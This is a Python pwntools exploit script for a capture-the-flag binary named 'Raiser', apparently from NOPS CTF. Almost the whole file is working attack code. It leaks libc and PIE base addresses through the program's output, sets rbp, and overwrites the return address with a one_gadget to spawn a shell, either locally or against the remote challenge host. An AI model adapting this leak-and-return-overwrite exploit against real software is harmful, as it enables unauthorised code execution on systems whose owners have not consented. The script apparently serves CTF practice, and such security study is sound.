#!/usr/bin/env python3
import os
import sys
from pwn import *

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-archive/pwn/Raiser/raiser')
elf = ELF(TARGET)
libc = ELF('./libc.so.6')

def attach(r):
    if REMOTE:
        return

    bkps = ['*main+405']
    cmds = []

    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r):
    attach(r)

    # get libc base
    r.sendlineafter(b'base:\n> ', str(0x539).encode())
    r.sendlineafter(b'power:\n> ', str(19).encode())
    r.recvuntil(b'feature!\n')

    main_ret = int(r.recvline().strip().decode())
    libc_base = main_ret - libc.libc_start_main_return
    one_gadget = libc_base + 0xeb66b

    # get pie base
    r.sendlineafter(b'base:\n> ', str(0x539).encode())
    r.sendlineafter(b'power:\n> ', str(21).encode())
    r.recvuntil(b'feature!\n')

    main = int(r.recvline().strip().decode())
    pie_base = main - elf.sym['main']
    power = pie_base + elf.sym['power']
    bss_800 = pie_base + elf.bss() + 0x800

    log.info(f'pie_base: {hex(pie_base)}')
    log.info(f'libc_base: {hex(libc_base)}')

    # dummy
    for i in range(18):
        r.sendlineafter(b'base:\n> ', str(0).encode())
        r.sendlineafter(b'power:\n> ', str(0).encode())
    
    # set rbp
    r.sendlineafter(b'base:\n> ', str(power + 0x78).encode())
    r.sendlineafter(b'power:\n> ', str(0).encode())

    # set return
    r.sendlineafter(b'base:\n> ', str(one_gadget).encode())
    r.sendlineafter(b'power:\n> ', str(0).encode())

    # exit
    r.sendlineafter(b'base:\n> ', str(0).encode())
    r.sendlineafter(b'power:\n> ', str(bss_800).encode())
    r.interactive()
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('nopsctf-c9afdf2ff27b-raiser-1.chals.io', 443, ssl=True)
    else:
        REMOTE = False
        r = process([TARGET,])

    exploit(r)
    exit(0)
